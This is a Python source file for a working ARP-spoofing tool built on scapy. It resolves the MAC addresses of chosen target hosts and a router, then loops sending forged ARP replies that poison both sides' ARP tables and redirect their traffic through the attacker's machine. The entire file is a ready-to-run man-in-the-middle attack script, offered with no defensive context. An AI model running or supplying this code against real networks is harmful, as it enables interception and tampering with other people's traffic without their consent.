import time
from scapy.all import srp, send
from scapy.layers.l2 import Ether, ARP
from portScanner import checkIP


# get the mac address for the target and router, by sending ARP Request packets
def getMacAddress(ip_address):
    broadcast_layer = Ether(dst='ff:ff:ff:ff:ff:ff')  # broadcast layer
    arp_layer = ARP(pdst=ip_address)  # arp request packet
    get_mac_packet = broadcast_layer / arp_layer  # full packet to send
    answer = srp(get_mac_packet, timeout=2, verbose=False)[0]  # sends the packet and receives a packet

    return answer[0][1].hwsrc
    # the first packet is the response, contain the packet that was sent and the packet recieved from the other machine
    # in that packet contains its MAC address


# sends the spoof packets that change the ARP table in both target and router
def spoof(routerIP, targetIP, routerMAC, targetMac):
    # op=2 means its a arp response packet
    # hwdst is the hardware destination(mac address), where the packet is being sent
    # pdst is the IP address destination, where the packet is being sent
    # prsc is the IP address source, is where the packet is coming from. Who is being impersonated
    # the hwsrc is automatically set the machine sending the packet.
    packet1 = ARP(op=2, hwdst=routerMAC, pdst=routerIP,
                  psrc=targetIP)  # packet sent to the router impersonating the target
    packet2 = ARP(op=2, hwdst=targetMac, pdst=targetIP, psrc=routerIP)  # packet sent to target impersonating the router
    send(packet1)
    send(packet2)


if __name__ == '__main__':
    try:
        tip, rip = False, False  # for inputted target and router ip checks
        targetIp, routerIp = str(), str()
        listOfTargetIps = list()
        while not tip:  # if theres a error in the target ip
            targetIp = input('[+] Enter Target ip): ').strip(' ')
            if ',' in targetIp:
                for ip_add in targetIp.split(','):
                    if checkIP(ip_add)[0] == ip_add:  # check if its a valid ip
                        tip = True
                    else:  # if not print ask the question again, by breaking the loop
                        print(ip_add + 'not an ip address')
                        tip = False
                        break
            if ',' not in targetIp:
                if checkIP(targetIp)[0] == targetIp:  # check if its a valid ip
                    tip = True
                else:  # if not print the error and ask the question again, by breaking the loop
                    print(targetIp + 'not an ip address')
                    tip = False
        for ips in targetIp.split(','):  # places targets in this array
            listOfTargetIps.append(ips)
        print(listOfTargetIps)

        while not rip:  # while the router ip is invalid repeat the question
            routerIp = input('[+] Enter Router ip): ').strip(' ')
            if checkIP(routerIp)[0] == routerIp:  # check if its a valid ip
                rip = True
            else:  # if not print the error and ask the question again, by breaking the loop
                print(routerIp + 'not an ip address')
                print('try again\n')
                rip = False

    except KeyboardInterrupt:
        print('\nClosing ARP Spoofer.')
        exit(0)
    else:
        try:
            listOfTargetMacs = list()
            for ip in listOfTargetIps:
                listOfTargetMacs.append(str(getMacAddress(ip)))

            router_mac = str(getMacAddress(routerIp))
            print(router_mac)
            print(listOfTargetMacs)
        except IndexError:
            print("Mac Address of " + ip + " not found")
        except KeyboardInterrupt:
            print('bye')
        except:
            print('error connecting')
        else:
            try:
                while True:
                    for x in range(len(listOfTargetMacs)):
                        spoof(routerIp, listOfTargetIps[x], router_mac, listOfTargetMacs[x])
                        time.sleep(
                            round(2 / len(listOfTargetMacs), 2))  # ensures each ip is spoofed every two seconds

            except KeyboardInterrupt:
                pass

            except:
                print('error connecting')
